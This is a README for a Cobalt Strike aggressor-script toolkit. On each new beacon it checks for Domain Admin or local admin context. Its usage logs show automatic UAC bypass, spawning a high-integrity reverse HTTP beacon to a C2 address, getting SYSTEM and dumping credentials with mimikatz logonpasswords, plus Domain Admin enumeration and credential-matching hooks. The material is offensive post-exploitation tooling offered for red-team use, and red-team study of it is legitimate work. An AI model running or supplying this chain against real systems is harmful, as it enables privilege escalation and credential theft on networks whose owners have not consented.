# CobaltStrike-ToolKit
I’m sure there are better ways of doing all of this but as of right now there hasn’t been much put out so this will do :)

## Work Conducted by:
- Alexander Rymdeko-Harvey [Twitter] @Killswitch-GUI -- [Web] CyberSydicates.com
- Brian R [Twitter] @brian_psu

## CheckDA - Command

Currently uses a PowerShell based check, combined with an aggressor script to check for the initial agent user name.
While using .NET 3.5 to perform Domain Group enumeration (PowerShell 2+ safe). This allows for alerting on Pen-Test of a DA level beacons. 
- Places a note on the beacon
- Logs to the Event Log for team to see PID
- uses a Pop up to alert opperator

### Usage
Load up the Script:
```
aggressor> load /root/Tools/CobaltStrike-ToolKit/Initial-DACheck.cna
[+] Load /root/Tools/CobaltStrike-ToolKit/Initial-DACheck.cna
```
When a initial beacon comes in you receive a pop up box and will see:
```
[*] Tasked beacon to import: /root/Tools/CobaltStrike-ToolKit/Invoke-DACheck.ps1
[*] Tasked beacon to run: Invoke-DACheck -Initial True
[+] host called home, sent: 2527 bytes
[+] received output:
Found-DA-User: admin
```
### Independent Command:
```
beacon> checkda
[*] Tasked beacon to import: /root/Tools/CobaltStrike-ToolKit/Invoke-DACheck.ps1
[*] Tasked beacon to run: Invoke-DACheck
[+] host called home, sent: 2519 bytes
[+] received output:
[!] Currently DA Context
```
## CheckLA - Command

Currently uses a PowerShell based check, combined with an aggressor script to check for the initial agent context.
While using .NET 3.5 to perform Local Group enumeration and Token Context (PowerShell 2+ safe). This has the following context:

1. Checks for Initial Beacons Context (Elevated or Local Admin)
2. If the beacon is elevated it will Auto Getsystem, and run LogonPasswords
3. If the beacon in Local Admin but not in a high integrity process it will run Bypass UAC on that beacon
4. This will than launch a beacon in a high integrity beacon causing the first event to fire running LogonPasswords

### Usage 
Run this with all the other scripts
```
aggressor> load Initial-LAdminCheck.cna
[+] Reload /root/Tools/CobaltStrike-ToolKit/Initial-LAdminCheck.cna
```
when a Initial Beacon comes in:
```
aggressor> reload Initial-LAdminCheck.cna
[+] Reload /root/Tools/CobaltStrike-ToolKit/Initial-LAdminCheck.cna
```
If it returns as a Local Admin it will perform Bypass UAC:
```
[*] Tasked beacon to spawn windows/beacon_http/reverse_http (192.168.1.198:80) in a high integrity process
[+] host called home, sent: 76304 bytes
```
The new beacon will run logonPassword as desired :)
```
[*] Tasked beacon to get SYSTEM
[*] Tasked beacon to run mimikatz's sekurlsa::logonpasswords command
[+] host called home, sent: 444597 bytes
[+] Impersonated NT AUTHORITY\SYSTEM
[+] received output:
```
### Independent Command 
```
beacon> checkla
[*] Tasked beacon to import: /root/Tools/CobaltStrike-ToolKit/CheckLAdminContext.ps1
[*] Tasked beacon to run: Invoke-LocalAdminCheck
[+] host called home, sent: 2622 bytes
[+] received output:
[!] Currently-in-LocalAdmin-Context
```
## DA-Watch - Set of Commands

Developed by @britz to perform the same DA monitoring but using all Aggressor script to perform DA Group checks (OPSEC). This has a few commands and requires you to update the list of DA members. this can be done with a few commands and is very effective way of checking for DA without loading PowerShell. On Pen-test's its not a big problem but on a red team OP this may be a No-Go.

### Usage
 load up the script
```
aggressor> load DA-Watch.cna
[+] Reload /root/Tools/CobaltStrike-ToolKit/DA-Watch.cna
```
Run this command and it will populate the known DA list
```
shell net group /domain "Domain Admins"
```
### uaddDA - Command
Adds a user to the DA list
### uremDA - Command
Removes a user from the DA list
### ulistDA - Command
Prints a list of the current DA's to the Console
### uhookOn
Sets the hook to follow beacon output to "On". This will watch all output for Shell net group...
### uhookOff
Turns off the watch hook and set the follow beacon output to off.

### Credential Checks
Every time a Cred is added to the Cred data model a credential is checked against the known list of creds. If it matches it posts to the event log! 




